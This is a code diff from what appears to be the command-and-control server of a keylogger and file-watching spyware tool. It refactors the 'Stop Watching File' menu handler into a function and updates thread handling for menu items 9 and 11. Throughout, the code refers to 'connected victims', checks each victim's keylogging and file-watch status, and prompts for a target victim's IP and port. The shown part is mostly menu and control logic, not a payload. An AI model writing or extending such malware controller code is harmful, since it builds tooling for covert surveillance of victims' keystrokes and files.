@@ -65,7 +65,7 @@ if __name__ == '__main__':
 
                 # MENU ITEM 9 - Watch File
                 if command == constants.PERFORM_MENU_ITEM_NINE:
-                    perform_menu_item_9(connected_clients, global_thread, signal_queue)
+                    global_thread = perform_menu_item_9(connected_clients, global_thread, signal_queue)
 
                 # MENU ITEM 10 - Watch Directory
                 # 1) If the file is ADDED (in directories), store it in the
@@ -73,49 +73,7 @@ if __name__ == '__main__':
 
                 # MENU ITEM 11 - Stop Watching File
                 if command == constants.PERFORM_MENU_ITEM_ELEVEN:
-                    print(constants.STOP_WATCH_FILE_MSG)
-
-                    # CASE 1: Check if client list is empty
-                    if len(connected_clients) == constants.ZERO:
-                        print(constants.STOP_WATCH_FILE_NO_CLIENTS_ERROR)
-
-                    # CASE 2: Handle single client in client list
-                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
-                        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))
-
-                        # Check if currently keylogging
-                        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
-                            print(constants.RETURN_MAIN_MENU_MSG)
-                            print(constants.MENU_CLOSING_BANNER)
-                            break
-
-                        # Check if currently watching a file
-                        if is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
-                            perform_menu_item_11_helper(client_ip, client_port, global_thread, signal_queue)
-                        else:
-                            print(constants.NOT_WATCHING_FILE_ERROR)
-
-                    # CASE 3: [Multiple Clients] Watch File for a specific connected victim
-                    elif len(connected_clients) != constants.ZERO:
-                        ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
-                        port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
-                        (target_socket, ip, port, status, status_2) = find_specific_client_socket(connected_clients,
-                                                                                                  ip, port)
-
-                        if target_socket:
-                            if is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
-                                pass
-                            if not is_watching(status_2, ip, port, constants.WATCH_STATUS_TRUE_ERROR):
-                                print(constants.NOT_WATCHING_FILE_ERROR)
-                                pass
-                            else:
-                                perform_menu_item_11_helper(ip, port, global_thread, signal_queue)
-                        else:
-                            print(constants.TARGET_VICTIM_NOT_FOUND)
-
-                    # Print closing statements
-                    print(constants.RETURN_MAIN_MENU_MSG)
-                    print(constants.MENU_CLOSING_BANNER)
+                    global_thread = perform_menu_item_11(connected_clients, global_thread, signal_queue)
 
                 # MENU ITEM 12 - Connect to a specific victim
                 if command == constants.PERFORM_MENU_ITEM_FOURTEEN:
